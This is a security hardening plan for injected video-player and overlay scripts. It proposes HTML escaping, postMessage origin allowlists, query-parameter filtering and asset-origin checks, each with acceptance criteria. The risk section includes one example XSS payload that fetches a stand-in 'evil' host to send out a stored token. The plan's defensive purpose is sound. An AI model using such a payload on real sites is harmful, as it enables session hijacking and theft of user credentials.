# Security hardening — runtime augment scripts

**Date:** 2026-07-24
**Scope:** `public/runtime/{reskin-player,demo-overlays,admin-toggle}.js`
**Goal:** Close the four security implications identified in the analysis. Behaviour-preserving; no structural refactor here (that is a separate plan). Each fix is surgical.

Constraint that shapes every fix: these files are injected **verbatim** into the LearningSuite origin (no build step, no modules). Fixes must stay inside each standalone IIFE and must not change observable playback/overlay behaviour for valid configs.

---

## Implication #1 — Stored XSS via unescaped `innerHTML` (HIGH)

### Risk

`demo-overlays.js` interpolates config-derived strings directly into `innerHTML` with no escaping. The config crosses a trust boundary (authored in the LearningSuite embed block by course creators; per the research doc, eventually served from a public content endpoint). A string such as `"<img src=x onerror=fetch('//evil/?'+localStorage.token)>` executes **in the LearningSuite origin**, where every GraphQL request carries a `Bearer <JWT>`. Impact: session/token exfiltration, not cosmetic.

### Injection points (all in `demo-overlays.js`)

Config-derived values written into `innerHTML`:

- `renderScience` (~L419–424): `active.name`
- `renderAudio` (~L559–586): `active.title`, `active.voice`
- `renderMetaStep` (~L603–609): `active.n`, `active.title`
- `renderCoaching` (~L765–804): `p.title`, `p.description`, `iv.label`, `iv.title`, `iv.desc`, and attributes `data-phase-toggle="${p.id}"`, `data-seek="${p.startTimeSec}"`, `data-seek="${iv.t}"`
- `renderSciencePanel` (~L822–836): `s.name`, `s.description`, attributes `data-sci-card="${s.id}"`, `data-seek="${t}"`
- `renderMeta` (~L851–866): `m.n`, `m.title`, attribute `data-seek="${m.t}"`

Selector built from config id (attribute-selector injection / breakage):

- `renderScienceHighlight` (~L844): `sciencePanel.querySelector(`[data-sci-card="${id}"]`)`

Related latent sink (not demo config, but same class) in `reskin-player.js`:

- `onTime` (~L989): `wrap.innerHTML = o.render?.(...)` — overlay HTML from `setOverlays`. The demo calls `setOverlays([])`, so unused today. Document that `render()` output is the caller's responsibility to pre-escape; do **not** attempt generic escaping here (render legitimately returns HTML).

### Change

1. Add one helper near the top of `demo-overlays.js` (after the `T` theme object):
   ```js
   const esc = (v) =>
     String(v ?? "").replace(
       /[&<>"']/g,
       (c) =>
         ({
           "&": "&amp;",
           "<": "&lt;",
           ">": "&gt;",
           '"': "&quot;",
           "'": "&#39;",
         })[c],
     );
   ```
2. Wrap **every** config-derived interpolation listed above in `esc(...)`, for both text and attribute positions. Example:
   ```js
   // before
   <strong ...>${iv.title}</strong>
   // after
   <strong ...>${esc(iv.title)}</strong>
   // attribute
   <div data-sci-card="${esc(s.id)}" ...>
   ```
   Leave values that are never config-derived un-wrapped (loop index `i+1`, `fmt(...)` output which is numeric-only, `dur`). `fmt` already coerces via `|0`, so its output is safe; still cheap to leave as-is.
3. For the config-id selector lookup, use `CSS.escape`:
   ```js
   const card = sciencePanel.querySelector(
     `[data-sci-card="${CSS.escape(id)}"]`,
   );
   ```

### Acceptance criteria

- AC1: A config value containing `<img src=x onerror=...>` in any of `phase.title/description`, `intervention.title/desc/label`, `science.name/description`, `meta.title`, `audio.title/voice` renders as literal text — no element is created, no handler fires.
- AC2: A config `id` containing `"` (e.g. `s"1`) does not break the `data-sci-card` attribute nor the highlight `querySelector`; highlight still targets the correct card.
- AC3: For a clean, valid config, rendered overlays/sidebar are visually identical to pre-change (no double-escaping of normal text, no `&amp;` for a literal `&` in a title is acceptable and expected).

---

## Implication #2 — `postMessage` with no origin check (MEDIUM)

### Risk

`reskin-player.js` (~L59–65) accepts any `message` event where `m.__source === 'sidepanel'` and calls `seek/play/pause` — no `ev.origin` check, so any frame/window can drive playback. Outbound (~L66–70) broadcasts player state to **every** iframe with target origin `'*'`, leaking playback state to third-party embeds.

### Change

1. **Inbound** — add an origin allowlist and payload validation:
   ```js
   const trustedOrigins = new Set([
     location.origin,
     ...(Array.isArray(window.__vpTrustedOrigins)
       ? window.__vpTrustedOrigins
       : []),
   ]);
   window.addEventListener("message", (ev) => {
     if (!trustedOrigins.has(ev.origin)) return;
     const m = ev.data;
     if (!m || typeof m !== "object" || m.__source !== "sidepanel") return;
     if (m.type === "seek" && Number.isFinite(m.time)) api.seek(m.time);
     else if (m.type === "play") api.play();
     else if (m.type === "pause") api.pause();
   });
   ```
   `window.__vpTrustedOrigins` lets the host opt-in cross-origin sidebar iframes without code changes. Default = same-origin only.
2. **Outbound** — derive each iframe's target origin from its `src` instead of `'*'`; skip iframes whose origin can't be determined and aren't same-origin:
   ```js
   bus.on("any", (p) => {
     document.querySelectorAll("iframe").forEach((f) => {
       let targetOrigin;
       try {
         targetOrigin = new URL(f.src, location.href).origin;
       } catch {
         return;
       }
       if (!trustedOrigins.has(targetOrigin)) return;
       try {
         f.contentWindow?.postMessage(
           { __source: "player", ...p },
           targetOrigin,
         );
       } catch {}
     });
   });
   ```
   Note: this restricts broadcast to trusted-origin iframes. If sidebars are same-origin (current POC has no iframe sidebar), this is a no-op functionally. Confirm the intended sidebar-iframe origin(s) before finalizing — see Open Questions.

### Acceptance criteria

- AC1: A `postMessage` from an untrusted origin with `{__source:'sidepanel', type:'play'}` does **not** start playback.
- AC2: A same-origin (or `__vpTrustedOrigins`-listed) `seek` with a finite `time` still seeks; a `seek` with `time: "abc"`/`NaN`/absent is ignored.
- AC3: Player events are posted only to trusted-origin iframes, with a concrete target origin (never `'*'`).

---

## Implication #3 — Vercel protection-bypass secret in asset URLs (LOW / operational)

### Risk

`withRuntimeAssetQuery` (`reskin-player.js` ~L173–190) copies **all** of the script URL's query params — including the documented `x-vercel-protection-bypass=SECRET` — onto same-origin manifest/VTT fetches. The secret is already visible in page source by design (docs: "carries no secrets"), so this is defence-in-depth + hygiene, not a code vulnerability.

### Change (two parts, pick per Open Questions)

1. **Operational (preferred):** host the runtime as **public** static assets (research doc "Public preview" option) so no bypass secret is embedded in the LearningSuite page at all. The scripts carry no secrets, so this is acceptable. If adopted, `withRuntimeAssetQuery` becomes a no-op (no query to propagate) and the code change below is optional.
2. **Defensive code (if the secret must stay in the URL):** restrict `withRuntimeAssetQuery` to forward only an allowlisted param name, so unrelated query params never leak onto subresource fetches:
   ```js
   const FORWARDED_QUERY_PARAMS = new Set(["x-vercel-protection-bypass"]);
   // inside the forEach:
   source.searchParams.forEach((value, key) => {
     if (!FORWARDED_QUERY_PARAMS.has(key)) return;
     if (!target.searchParams.has(key)) target.searchParams.set(key, value);
   });
   ```

### Acceptance criteria

- AC1: With public hosting, no `x-vercel-protection-bypass` appears in any page-embedded script URL (verified operationally).
- AC2: If the defensive code path is taken, only allowlisted params are appended to fetched asset URLs; an unrelated param on the script URL is not propagated.
- AC3: Language-pack manifest/VTT/audio still load under the chosen hosting mode.

---

## Implication #4 — Language-pack fetch of config-driven URLs (LOW)

### Risk

`reskin-player.js` resolves `track.url` from a language-pack manifest (or the `window.__vpLanguagePacks[videoId]` override) via `resolveUrl(track.url, baseUrl)` and then `fetch`es it (subtitles) or assigns it to `externalAudio.src` (audio). A manifest or override could point these at an arbitrary cross-origin URL. Manifests are same-origin today and the override is host-set (so an attacker already needs JS execution), but there is no origin constraint on the resolved URLs. Subtitle text is rendered via `textContent` (safe); the concern is arbitrary outbound fetch / audio source, and cross-origin propagation of the bypass query param.

### Change

Constrain resolved track URLs to an origin allowlist inside `normalizeLanguagePack` (both `audioTracks` and `subtitleTracks`):

```js
const allowedOrigins = new Set([
  new URL(baseUrl || location.href, location.href).origin,
  location.origin,
  ...(Array.isArray(window.__vpTrustedOrigins)
    ? window.__vpTrustedOrigins
    : []),
]);
const isAllowedAsset = (u) => {
  try {
    return allowedOrigins.has(new URL(u, location.href).origin);
  } catch {
    return false;
  }
};
```

- Drop (filter out) audio tracks whose resolved `url` is not allowed and not `useNative`.
- Skip the `fetch` for subtitle tracks whose `url` is not allowed (still keep inline `track.cues` if present).
  Reuse the same `__vpTrustedOrigins` global introduced in #2 so the host has one opt-in list.

### Acceptance criteria

- AC1: A manifest track pointing at a cross-origin URL (not in the allowlist) is not fetched and not set as `externalAudio.src`.
- AC2: Same-origin language packs (the current fixtures under `language-packs/<uuid>/`) load exactly as before — audio switch + subtitle rendering unchanged.
- AC3: An origin added to `window.__vpTrustedOrigins` is accepted.

---

## Cross-cutting: shared `esc` / origin logic

Because there is no shared module, `esc` lives in `demo-overlays.js` and the origin/allowlist logic lives in `reskin-player.js`. Accept the small duplication for now; consolidation is deferred to the structural-refactor plan (a possible `vp-common.js` loaded first). Do **not** introduce a shared file as part of this security pass — it changes the deployment surface (an extra `<script>` tag) and is out of scope.

## Testing strategy

The repo currently has **no test framework** (no Vitest/jsdom/Testing-Library, no `test` script). Options, in order of preference:

1. **Stand up Vitest + jsdom** for the pure/near-pure predicates by extracting them so they're importable: `esc`, the origin-allowlist predicate, `isAllowedAsset`, and `withRuntimeAssetQuery`. This satisfies the CLAUDE.md "tests per acceptance criteria" rule for the logic that matters most (escaping + allowlists) without needing a full DOM harness.
2. If test infra is out of scope for the spike, do **documented manual verification** in a scratch HTML page: a malicious-config fixture (AC1/#1), a cross-origin `postMessage` probe (AC1/#2), and a cross-origin manifest fixture (AC1/#4), with before/after screenshots alongside the existing `poc-*.png`.

Decision needed — see Open Questions.

## Open questions (resolve before implementing)

1. **Sidebar iframe origins (#2):** are cross-origin sidebar iframes actually used, and from which origin(s)? Determines the default `__vpTrustedOrigins` and whether the outbound broadcast change breaks anything. -> non isse, leave as is
2. **Hosting mode (#3):** switch to public static hosting (removes the secret entirely) or keep the bypass secret + apply the param allowlist? -> apply param allwolist
3. **Test infra:** stand up Vitest+jsdom now (option 1) or document manual verification (option 2)? -> no test framework now

## Out of scope (tracked for the refactor plan)

- Decomposing the monolithic IIFEs, extracting shared helpers, moving inline styles to stylesheets, reducing `window.__vp*` global state.
- Migrating to TypeScript / a build step.
